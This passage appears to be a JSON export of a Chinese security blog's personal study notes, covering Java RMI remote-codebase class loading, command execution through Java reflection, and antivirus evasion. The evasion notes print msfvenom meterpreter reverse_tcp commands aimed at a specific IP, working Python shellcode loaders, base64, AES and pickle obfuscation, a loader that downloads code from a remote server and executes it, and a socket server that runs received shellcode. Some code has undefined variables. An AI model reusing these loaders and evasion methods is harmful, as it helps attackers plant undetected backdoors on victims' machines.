，这个之前版本默认java.rmi.server.useCodebaseOnly=false  \n\n复现：按照安全漫谈5，写好3个服务类，之后运行服务端\nRemoteRMIServerpackage com.rmitest.CodeBase;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\nimport java.util.List;\n\npublic class RemoteRMIServer &#123;\n\tprivate void start() throws Exception &#123;\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tCalc h &#x3D; new Calc();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;refObj&quot;, h);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\tnew RemoteRMIServer().start();\n\t&#125;\n&#125;\n\n\n\nICalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\n\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException;\n&#125;\n\n\nCalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class Calc extends UnicastRemoteObject implements ICalc &#123;\n\tpublic Calc() throws RemoteException &#123;&#125;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;\n\t\tInteger sum &#x3D; 0;\n\t\tfor (Integer param : params) &#123;\n\t\t\tsum +&#x3D; param;\n\t\t&#125;\n\t\treturn sum;\n\t&#125;\n&#125;\n\n\n同时该文件夹需要有client.policy文件\ngrant &#123;\n\tpermission java.security.AllPermission;\n&#125;;\n\njavac *.java\n带着包名编译，在java文件目录无法执行程序，需要切换到src目录执行命令\n同时需要将Client.policy放到src目录下\njava -Djava.rmi.server.hostname=192.168.0.107 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy com.rmitest.CodeBase.RemoteRMIServer\n这时执行程序需要用完整程序名\n在另一个文件夹编写好client类，编译运行\nRMIClientpackage com.rmitest.CodeBaseClient;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\n\nimport com.rmitest.CodeBase.ICalc;\n\nimport java.util.ArrayList;\nimport java.io.Serializable;\n\npublic class RMIClient implements Serializable &#123;\t\n\t\n\tpublic class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;\n\tpublic void lookup() throws Exception &#123;\n\t\t&#x2F;&#x2F;需要设置，不然报错\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tICalc r &#x3D; (ICalc)\n\t\t\t\tNaming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;refObj&quot;);\n\t\tList&lt;Integer&gt; li &#x3D; new Payload();\n\t\tli.add(3);\n\t\tli.add(4);\n\t\tSystem.out.println(r.sum(li));\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tnew RMIClient().lookup();\n\t&#125;\n&#125;\n\njavac RMIClient.java -classpath ../../../\n修改命令\njava  -Djava.rmi.server.useCodebaseOnly=false  -Djava.rmi.server.codebase=http://ip:port/RMIClient$Payload.class -Djava.security.policy=client.policy com.rmitest.CodeBaseClient.RMIClient\n这个codebase可以修改为自己服务器的IP:port\n当客户端运行时，服务端在classpath找不到/RMIClient$Payload.class 时，会尝试去远程加载codebase路径下的 /RMIClient$Payload.class\n这时只需要将恶意类放到服务器的 /RMIClient$Payload.class  就能执行恶意代码  \n需要注意的是，这个客户端不能放到服务端一起，需要在另一个地方运行，连接后才能让服务端找不到 /RMIClient$Payload.class      但是就是这样复现就有问题了\n问题：\n复现时执行服务端和客户端代码都报错：错误: 找不到或无法加载主类\n尝试用客户端连接，发现报错：no security manager: RMI class loader disabled\n再次尝试连接报错：Exception in thread “main” java.security.AccessControlException: access denied (“java.net.SocketPermission” “192.168.0.107:1099” “connect,resolve”)\n解决前面的问题后发现只能本地访问**/RMIClient$Payload.class,就算删除本地/RMIClient$Payload.class文件，设置了codebase远程连接他也不会远程访问获取，而是直接报错找不到该文件**\n\n解决：\n配置好classpath，尝试去除包名编译，可以运行服务端\n这个星球有人讲了，在客服端也需要设置SecurityManager\n这个解决方式是在客户端执行命令的时候也要在policy文件\n暂时没有解决\n\n","slug":"Java-RMI笔记","date":"2022-09-05T11:38:51.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"a87dfbaadf5431aac0df9631c18a8ee5","title":"Java反射笔记","content":"参考资料：\n廖雪峰老师Java教程   反射\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512\np牛Java安全漫谈  反射篇1，2，3\nhttps://t.zsxq.com/056qbMzVV\nhttps://t.zsxq.com/05BiAyF6Y\nhttps://t.zsxq.com/05yrbEQVb\n常见的两种可以通过反射执行命令的类\njava.lang.Runtime\njava.lang.ProcessBuilder\n\n正常反射调用public方法   无参构造方法通过Method调用，能获取所有public方法，和父类中的方法\nimport java.lang.reflect.Method;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\nMethod execMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);\n\nMethod getRuntimeMethod &#x3D; clazz.getMethod(&quot;getRuntime&quot;);\n\nObject runtime &#x3D; getRuntimeMethod.invoke(clazz);\n\nexecMethod.invoke(runtime, &quot;calc.exe&quot;);\n\n按照反射原理，正常创建类实例，之后通过类实例获取类方法，再通过获取到的类方法执行命令，通过invoke()进行执行。\n反射其实在编译时，就是正常的类的实例化和正常的方法调用\n通过反射调用ProcessBuilder执行命令    有参构造方法使用public ProcessBuilder(List command)这里使用Constructor进行反射调用，Constructor接收的参数为构造方法，通过Constructor可以实例化带参数的构造方法的类\nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n   \t\t&#x2F;&#x2F;强制转换类型调用\n\n    \t((ProcessBuilder)clazz.getConstructor(List.class).newInstance(\n\n    \t\t\tArrays.asList(&quot;calc.exe&quot;))).start();\n\n    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(\n\n   \t\t\tArrays.asList(&quot;calc.exe&quot;)));\n\npublic ProcessBuilder(String… command)这里调用该类中另一种构造方法进行类实例\n该构造方法采用可变长参数（varargs）  \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(\n\n​    \t\t\tnew String[][]&#123;&#123;&quot;cmd&quot;,&quot;calc.exe&quot;&#125;&#125;)).start();\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \tnew String[][] &#123;&#123;&quot;calc.exe&quot;&#125;&#125;));\n\n​    \t&#x2F;&#x2F;球友写的，完全反射，但是一样的问题\n\n​    \t&#x2F;&#x2F;Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t&#x2F;&#x2F;Constructor constructor &#x3D; clazz.getConstructor(String[].class);\n\n​    \t&#x2F;&#x2F;Object o &#x3D; constructor.newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;);\n\n​    \t&#x2F;&#x2F;clazz.getMethod(&quot;start&quot;).invoke(o);\n\n\n\n其中复现执行命令，发现 java.lang.ProcessBuilder 在进行\n public ProcessBuilder(String… command）   有错误，无法复现\n构造函数调用时，会爆出 \nException in thread “main” java.lang.IllegalArgumentException: argument type mismatch\n解决方法参考文章：https://blog.csdn.net/qq_21383435/article/details/108277906\n文章参考的是：https://www.cnblogs.com/huqingchen/p/5979936.html\n文中提到反射调用可变参数方法是，必须要保证输入参数的数组长度为1\n原文：//可变参数必须这样封装，因为java反射内部实现做了参数个数为1的判断，如果参数长度不为1，则会抛出异常\n所以要按照下面这么写\nString[] a &#x3D; &#123;&quot;calc.exe&quot;&#125;;\n\n​    \tObject[] b &#x3D; &#123;a&#125;;\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \t b));\n\n\n\n使用getDeclaredConstructor()反射调用私有的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了     \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\n​    \tClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\n​    \tConstructor m &#x3D; clazz.getDeclaredConstructor();\n\n​    \tm.setAccessible(true);\n\n​    \tclazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;);\n\n这里又有问题，虽然设置了setAccessible为true，但是运行的时候还是报错，私有方法不可被调用\n在廖雪峰老师的教程中提到过虽然设置了setAccessible为true，但可能还是会有问题，就是不能访问\n原文：此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。\n解决方法查看本机java版本是1.8- 3.2.1猜测可能是java版本过高\n去采用虚拟机里的1.8-2.x.x编译执行，成功执行命令\n测试本机命令行执行时发现，提示找不到主类\n再去除包名后重新编译，发现主机还是不能执行\n测试得出结论就是环境问题，同一个class文件，虚拟机能执行，主机不能执行\n","slug":"Java反射笔记","date":"2022-09-05T11:36:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"170904693726acf3c72f07df195a2a4e","title":"免杀入门-小迪笔记","content":"杀软检测方式在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到\n免杀常见初始思路加载方式修改各种shellcode加载方式达到免杀效果\n如常见加载器项目：Callback_Shellcode_Injection\nhttps://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\n但是使用过多已经完全被pass\n替换shellcode为自己的shellcode\n编码混淆加密算法利用常见的编码方式，如：Xor Aes Hex Rc4 Rsa等\n将shellcode编码，再到源文件加载前进行解码\nxor和aes加密metasploit的x86初始类型的shellcode使用该项目：https://github.com/Arno0x/ShellcodeWrapper\n生成raw类型shellcode文件\nmsfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=175.178.41.176 LPORT=6666 -f raw &gt; shellcode.raw\n脚本使用方式，本地安装requestments有问题\n加密库安装有问题，需要安装c++14.0 用vs studio安装\n使用python39 报错语法有问题，切换成py2可以加密成功\n工具下载最新的，防止bug\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw key xor\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor\n-表示输出的文件类型，直接可编译，以上输出cpp，cs，py三种类型，cs是c#文件\nkey表示加密密钥\nxor表示加密方式\n\nencryptedShellcodeWrapper.cpp- 目前仅支持XOR 加密\nencryptedShellcodeWrapper.cs- 支持 XOR 和 AES 加密\nencryptedShellcodeWrapper.py- 支持 XOR 和 AES 加密\n\n生成的cpp文件打开后显示头文件错误，直接注释那一行\n之后将cpp文件生成exe\ncs编译  **C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319&gt;**csc /out:D:\\BaiduNetdiskDownload\\test\\test.exe D:\\BaiduNetdiskDownload\\test\\encryptedShellcodeWrapper_xor.cs\nmsf开启监听，测试脚本是否能上线\nexe执行报错，执行发现缺少dll文件，应该是x86的原因，测试一下其他的\n项目写的有问题，不用测试了，md，生成的文件编译后执行都有问题\n使用python3生成，但是python3生成时语法报错，真是个垃圾项目\n还有小迪自己编写的加密代码xor.py\npython xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin\nhex加密使用shellcodelloader.exe生成exe文件\n生成payload，将生成的payload去掉   “  ,可能不能存在换行\n下载下来，使用工具生成exe，运行报错\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://gchq.github.io/CyberChef/\nhttps://github.com/ByPassAVTeam/ShellcodeLoader\nLoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)\nRc4加密msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://blog.csdn.net/weixin_45590789/article/details/105536623\n使用方法，将rc4.cpp中的shellcode替换成msf生成的shellcode\n用vs调试，会生成加密后的shellcode，再将msf生成的shellcode替换为加密shellcode\n之后生成exe，可以将代码里的打印去掉，打印会导致弹窗打印\n前面也可以加上隐藏窗口代码\n","slug":"免杀入门-小迪笔记","date":"2022-09-05T11:23:50.000Z","categories_index":"python","tags_index":"免杀","author_index":"Longw"},{"id":"8d7177d71a9701596b230fd390060764","title":"python免杀-小迪笔记","content":"\n\npython免杀   小迪安全加载shellcode方式首先是shellcode两种常见的利用python的加载方式\n\n\n\nimport ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\n\n\n\nimport ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\n\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\n\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\n\n代码中每个函数的意思就不写了，想了解的看这篇：https://blog.csdn.net/solitudi/article/details/115283329\n讲讲小白入门的坑点吧！！！\n首先就是python的环境，刚开始在本机、虚拟机、win服务器都测试了一遍，都不能正常运行一直报错，后来才知道这个加载方式必须要使用python的32位版本，只有32位才能正常运行上面的代码。\npython是32位的，那payload当然也必须是32位的。\n然后就是ctypes这个库，在使用pip安装之后，你会发现还是加载不了，这个时候就需要去找到下载的库文件，修改ctypes这个文件夹的首字母为大写，之后才能正常的加载这个库。还是不行，就用pip安装ctypesdemo这个库，再修改ctypes文件夹首字母大写。\n解决上面的问题，你就能正常执行代码。上线cs和msf了。\n编码混淆直接加载shellcode，不用说，肯定被杀，所以要将shellcode进行编码或者加密达到混淆的效果，绕过杀软的检测\nbase64首先就是base64编码了，将shellcode进行base64编码，将编码的作为shellcode，在执行前进行解码\nimport ctypes\n\nshellcode &#x3D; b&#39;base64(shellcode)&#39;\n#base64.b64encode(shellcode)\nbase64.b64decode(shellcode)\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\naesbase64用的太多，在进行一层aes加密。使用base64编码的shellcode进行aes加密，用该加密shellcode作为代码中的shellcode，之后进行aes加密，再base64解码，在进行加载shellcode\nfrom Crypto.Cipher import AES\nimport ctypes\nimport base64\n\nBLOCK_SIZE &#x3D; 16  # Bytes\npad &#x3D; lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \\\n                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\nunpad &#x3D; lambda s: s[:-ord(s[len(s) - 1:])]\n\ndef aesDecrypt(key, data):\n    &#39;&#39;&#39;\n\n    :param key: 密钥\n    :param data: 加密后的数据（密文）\n    :return:明文\n    &#39;&#39;&#39;\n    key &#x3D; key.encode(&#39;utf8&#39;)\n    data &#x3D; base64.b64decode(data)\n    cipher &#x3D; AES.new(key, AES.MODE_ECB)\n\n    # 去补位\n    text_decrypted &#x3D; unpad(cipher.decrypt(data))\n    text_decrypted &#x3D; text_decrypted.decode(&#39;utf8&#39;)\n    #print(text_decrypted)\n    return text_decrypted\n\naes1 &#x3D; &#39;&#39;&#39;加密后的shellcode&#39;&#39;&#39;\n\nkey &#x3D; &#39;5c44c819appsapi0&#39;\nshellcode &#x3D; aesDecrypt(key, aes1)\n\ndata&#x3D;base64.b64decode(shellcode)\n\nbdata &#x3D; bytearray(data)\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\n\n这两种都是最常见的编码加密方式，还有xor，hex等。后面还可以尝试其他比较少见或者自己写个加密算法进行加密，可以达到很好的效果。\n序列化利用pickle库，将整个加载shellcode代码二进制化，在进行base64编码，将输出结果放到新的python文件里，使用pickle.loads()方式反序列化执行。\n\n序列化代码\n\nimport pickle\nimport base64\n\nshellcode &#x3D; &#39;&#39;&#39;\nimport ctypes,base64\nshellcode &#x3D; &quot;base64(shellcode)&quot;\ndata&#x3D;base64.b64decode(shellcode)\n#bdata &#x3D; bytearray(data)\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(data), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(data), len(data))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)&#39;&#39;&#39;\n\n\nclass A(object):\n    def __reduce__(self):\n        return (exec, (shellcode,))\n\n\nret &#x3D; pickle.dumps(A())\nret_base64 &#x3D; base64.b64encode(ret)\nprint(ret_base64)\n\n\n反序列化执行\n\nimport base64,pickle,ctypes\nshellcode &#x3D; b&#39;序列化编码结果&#39;\npickle.loads(base64.b64decode(shellcode))\n\n这种方式看起来花里胡哨的，最后生成exe直接被火绒给杀了，测试时好像过了360上线一段时间也没有被杀，当然只是学习思路\n打包器使用不同打包器也会有不同的免杀效果\npyinstallerpython最常使用的就是pyinstaller，最方便但是几乎没有免杀效果\n安装：\npip install pyinstaller\n\n常用：\npyinstall -F xxx.py\n\n好处就是生成的exe不用携带dll文件之类的\npy2exe需要自建setup.py来进行打包，免杀效果有那么一点，会产生dll文件，不携带无法运行exe文件\n安装：\npip install py2exe\n\n打包：\npython setup.py py2exe\n\nsetup.py代码\nfrom distutils.core import setup\nimport py2exe\nINCLUDES &#x3D;[&#39;xxx&#39;]#注意修改脚本项目名\noptions &#x3D;&#123;\n&quot;py2exe&quot;:\n&#123;\n&quot;compressed&quot;:1,# 0或1,1压缩，0不压缩\n&quot;optimize&quot;:2,# 0、1、2，文件的优化级别\n&quot;bundle_files&quot;:1,# 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定\n&quot;includes&quot;: INCLUDES,# 列表，包含其它的一些模块\n&quot;dll_excludes&quot;:[&#39;MSVCP90.dll&#39;]# 列表，包含的dll文件不会打包进exe程序\n&#125;\n&#125;\nsetup(\nversion&#x3D;&#39;1.0.0&#39;,\noptions&#x3D;options,\ndescription&#x3D;&quot;this is a xiaodi test&quot;,\nzipfile&#x3D;None,# 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中\nconsole&#x3D;[&#123;&quot;script&quot;:&#39;xxx.py&#39;&#125;]# 生成一个控制台形式的exe程序，对应的有windows&#x3D;[]，生成GUI形式的exe程序\n)\n\n需要修改INCLUDES后面的内容位py文件名不带后缀，然后是下面的console，需要携带后缀名。\nNuitka免杀效果还行，就是会有一堆附属文件需要整个dict文件夹上传才能运行\n安装参考：https://zhuanlan.zhihu.com/p/133303836\n最常用使用方式：\nnuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to&#x3D;utils,src --output-dir&#x3D;out xxx.py\n\n文件提取shellcode前面不管哪种方式，shellcode代码都是存在源py文件中，只是加密方式不同，文本提取则不同，shellcode本身并不会存在于源py文件，而是从外部获取。就是常说的无文件落地。\nreadfile最简单的就是从txt文件获取，小迪师傅演示三种，一种是读取shellcode，一种是读取shellcode和加载器，一种是读取混淆后的shellcode，替换混淆值为空\n直接来三种结合的，读取混淆的shellcode和加载器\n添加的混淆字符串还是使用xiaodi\nreadfile代码\nimport ctypes\nimport base64\n\n\ndef sc():\n    with open(&#39;s.txt&#39;, &#39;r&#39;) as f:\n        s &#x3D; f.read()\n    s &#x3D; s.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    sc &#x3D; base64.b64decode(s)\n    return sc\n\ndef zx(s):\n    sc&#x3D;s\n    with open(&#39;z.txt&#39;, &#39;r&#39;) as f:\n        z &#x3D; f.read()\n    z &#x3D; z.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    zx &#x3D; base64.b64decode(z)\n    exec(zx)\n\ns&#x3D;sc()\nz&#x3D;zx(s)\nprint(z)\n\ns.txt\n内容是base64编码并采用小迪字符串混淆的shellcode\n\nz.txt\n内容是base64编码并采用小迪字符串混淆的加载器代码\n\n免杀效果就不说了，比较只是学习思路\nargv参数获取前面采用文本获取，这里则是参数获取shellcode和加载器代码\n使用命令行输入加密shellcode和加密python加载器代码上线\npython test_argv.py base64shellcode base64加载器代码\nimport ctypes\nimport sys,base64\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    s&#x3D;sys.argv[1]\n    sc&#x3D;base64.b64decode(s)\n    z&#x3D;sys.argv[2]\n    zx&#x3D;base64.b64decode(z)\n    exec(zx)\n\nhttp远程加载将shellcode放到远程服务器的txt文件，用python开启http.serve服务，本地使用python的request请求加载\nimport ctypes,requests,base64\n\n\n\ndef g():\n    all&#x3D;requests.get(&#39;http:&#x2F;&#x2F;IP&#x2F;1.txt&#39;).text\n    return all\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    all&#x3D;base64.b64decode(g())\n    exec(all)\n\nsocket管道传输使用python开辟socket通道，上传服务端，本地使用客户端连接，通过客户端发送加载代码，服务端执行\n服务端\n# -*- coding:utf-8 -*-\n__author__ &#x3D; &#39;xiaodi&#39;\n\nimport kaisa\nimport socket,base64,ctypes,os\nserver&#x3D;socket.socket()\n\n\ndef zx(data):\n    sc&#x3D;base64.b64decode(data+b&#39;xxxxxxxxxxxxxxxxxxxxxx&#39;)\n    print(sc)\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n    return sc\n\n\nserver &#x3D; socket.socket()\nserver.bind((&quot;0.0.0.0&quot;,9999))\nserver.listen(5)\nwhile True:\n    conn,addr &#x3D; server.accept()\n    print(&quot;new addr:&quot;,addr)\n    while True:\n        data &#x3D; conn.recv(1024)\n        if not data:\n            print(&quot;客户端已断开&quot;)\n            break\n        print(&quot;执行指令：&quot;,data)\n        zx(data)\n        if len(cmd_res) &#x3D;&#x3D; 0:\n            cmd_res &#x3D; &quot;cmd has no output....&quot;\n        conn.send( str(len(cmd_res.encode())).encode() )  #发送服务端发送给客户端数据的长度\n        conn.send(cmd_res.encode(&quot;utf-8&quot;))   #发送服务端的数据\n        print(&quot;send done&quot;)\nserver.close()\n\n客户端\nimport socket\n\nclient &#x3D; socket.socket()\nclient.connect((&quot;IP&quot;, 9999))\n\nwhile True:\n    cmd &#x3D; input(&quot;&gt;&gt;&gt;:&quot;).strip()\n    if len(cmd) &#x3D;&#x3D; 0: continue\n    client.send(cmd.encode(&quot;utf-8&quot;))\n    cmd_res_size &#x3D; client.recv(1024)  # 接收命令的长度\n    print(&quot;命令结果大小：&quot;, cmd_res_size.decode())\n    recevied_size &#x3D; 0  # 接收客户端发来数据的计算器\n    recevied_data &#x3D; b&#39;&#39;  # 客户端每次发来内容的计数器\n    while recevied_size &lt; int(cmd_res_size.decode()):  # 当接收的数据大小 小于 客户端发来的数据\n        cmd_res &#x3D; client.recv(1024)\n        recevied_size +&#x3D; len(cmd_res)  # 每次收到的服务端的数据有可能小于1024，所以必须用len判断\n        recevied_data +&#x3D; cmd_res\n    else:\n        print(recevied_data.decode(&quot;utf-8&quot;, &quot;ignore&quot;))\n        print(&quot;cmd res receive done ....&quot;, recevied_size)\n\nclient.close()\n\n注意：服务端的zx函数中的sc需要截取最后一写加密的shellcode代码，全部使用客户端发送加载会导致报错\n当然需要修改客户端的远程连接IP\n先运行服务端，在使用客户端连接，之后会让你输入，输入前面那段shellcode代码之后就会自动上线\n还有一种采用自己编写的加密方式的，参考：https://forum.butian.net/share/1794\n隐写入PNG图片使用pillow库写入PNG图片\n写入python文件\n#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\n\n\n&quot;&quot;&quot;\n取得一个 PIL 图像并且更改所有值为偶数（使最低有效位为 0）\n&quot;&quot;&quot;\ndef RGBAmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1,t&gt;&gt;1&lt;&lt;1) for [r,g,b,t] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\ndef RGBmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1) for [r,g,b] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\ndef RGBAencodeDataInImage(image, data):\n    evenImage &#x3D; RGBAmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary) &gt; len(image.getdata()) * 4:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 4 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 &lt; len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    